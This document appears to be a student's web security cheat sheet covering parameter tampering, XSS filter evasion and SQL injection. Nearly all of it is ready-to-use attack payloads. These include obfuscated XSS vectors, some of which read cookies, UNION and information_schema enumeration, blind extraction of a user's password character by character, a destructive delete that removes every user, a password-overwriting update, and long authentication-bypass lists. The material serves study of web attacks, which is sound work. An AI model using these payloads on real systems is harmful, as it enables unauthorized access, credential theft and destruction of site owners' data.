# SC MST Cheat Sheet

###### tags: #SC 

## Table of Contents
```toc
```

## Parameter Tampering
### Tampering of Form Fields
- Form field values can be tampered on Burp Suite by intercepting packets and forwarding them

### Hidden Field
- If a website uses hidden fields to store status information, malicious user can tamper with the values stored in their browser and change the referred information
- Values can be modified via by inspecting elements in the web browser

### Tampering with URL Parameters
- URLs can show parameters and values can be modified:
```
# Original
https://www.example.com/defaut.asp?profile=123&value=123

# Modified (Statuses)
https://www.example.com/defaut.asp?profile=123&value=123&status=read
https://www.example.com/defaut.asp?profile=123&value=123&status=del
```

## XSS Filter Evasion
- Basic XSS Test
```html
<script>alert("Hello World!")</script>
```

### Image XSS Using JavaScript Directive
- No quotes or semicolons
```html
<img src=javascript:alert('XSS')>
```
- HTML entities
```html
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
```
- Grave accent obfuscation
```html
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
```
- Malformed `<a>` tags
```html
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
`\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>`
```
- Malformed `<img>` tags
```html
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```
- `fromCharCode` (if no quotes of any kind are allowed, use `eval()` to create any XSS vector)
```html
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
```
- Default `src` tag to get past filters that check SRC domain
```html
<IMG SRC=# onmouseover="alert('xxs')">
```
- Default `src` tag by leaving it empty
```html
<IMG SRC= onmouseover="alert('xxs')">
```
- Default `src` tag by leaving it out entirely
```html
<IMG onmouseover="alert('xxs')">
```
- On error alert
```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```
- `img onerror` and JavaScript alert encode
```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```
- Embedded tab
```html
<IMG SRC="jav ascript:alert('XSS');">
```
- Embedded encoded tab
```html
<IMG SRC="jav&#x09;ascript:alert('XSS');">
```
- Embedded newline to breakup XSS
```html
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
```
- Spaces and meta characters before the JavaScript in images for XSS
	- Useful if the pattern match does not take into account spaces in the word `javascript`
```html
<IMG SRC=" &#14; javascript:alert('XSS');">
```

### XSS Payload Lists

## SQL Injection
- Basic SQL Injection
```
1' or 1=1; -- -  
```
- ORDER BY Attack (column number)
```
1' order by 1; -- -
```
- UNION Attack
```
1' union select null; -- -
```
- `information_schema` Attacks (Use fillers to match number of columns in table)
```
1' union select 1,2,table_schema from information_schema.tables;-- - 
1' union select 1,table_name,table_schema from information_schema.tables; -- - 
1' union select 1,column_name,table_schema from information_schema.columns where table_name='tablename'; -- - 
```
- Using LIMIT to limit number of rows to display
```
1' union select 1,column2,column3 from table_name LIMIT 1; -- - 
```
- Using OFFSET:
```
1' union select 1,column2,column3 from table_name OFFSET 3; -- - 
```
- Using CONCAT to add two strings together
```
1' union select concat("hello", "world")
```
- Using the CHAR function to convert ASCII values to character values
```
PRINT 'a' + CHAR(9)  + 'b' -- horizontal tab 
PRINT 'a' + CHAR(10) + 'b' -- line feed 
PRINT 'a' + CHAR(11) + 'b' -- vertical tab 
PRINT 'a' + CHAR(13) + 'b' -- carriage return
```

- Attacking with IF and SUBSTRNG statements
> SUBSTRING() extracts a character from a string via its index

```
0' or userid=if([condition],'1','0'); -- - 
0' or userid=if((select substr(password,1,1) from user where userid='1')='a','1','0'); -- - 
0' or userid=if((select substr(password,1,1) from user where userid='1')='b','1','0'); -- - 

1' or userid=if((select substr(password,1,1) from user where userid='1')='a',sleep(0.3),'0'); -- - 
1' or userid=if((select substr(password,1,1) from user where userid='1')='abc',sleep(0.3),'0'); -- - 
```

**More attack scenarios:**
- `delete from user where userid = '${userid}'`
```
delete from user where userid = '' or 1=1;-- - '${userid}';
```
- `update user set age='${age}' where userid = '${userid}'`
```
update user set age='10', password='123';-- - '${age}' where userid='${userid}';
```

### SQL Injection Payloads
- **Basic Payloads**
```
1'1
1 exec sp_ (or exec xp_)
1 and 1=1
1' and 1=(select count(*) from tablenames); --
1 or 1=1
1' or '1'='1
1or1=1
1'or'1'='1
fake@ema'or'il.nl'='il.nl
```

- **Authentication Bypass**
```
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

